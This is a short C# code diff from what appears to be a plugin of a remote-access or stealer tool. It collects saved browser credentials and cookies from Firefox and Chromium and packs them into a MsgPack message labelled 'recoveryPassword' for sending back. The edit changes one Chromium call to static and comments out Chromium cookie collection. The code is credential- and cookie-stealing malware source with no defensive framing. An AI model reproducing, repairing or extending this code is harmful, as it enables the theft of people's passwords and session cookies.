@@ -12,11 +12,11 @@ namespace Plugin
             {
                 StringBuilder Credentials = new StringBuilder();
                 new Browsers.Firefox.Firefox().CredRecovery(Credentials);
-                new Browsers.Chromium.Chromium().Recovery(Credentials);
+                Browsers.Chromium.Chromium.Recovery(Credentials);
 
                 StringBuilder Cookies = new StringBuilder();
                 new Browsers.Firefox.Firefox().CookiesRecovery(Cookies);
-                new Browsers.Chromium.Chromium().CookiesRecovery(Cookies);
+                //new Browsers.Chromium.Chromium().CookiesRecovery(Cookies);
 
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
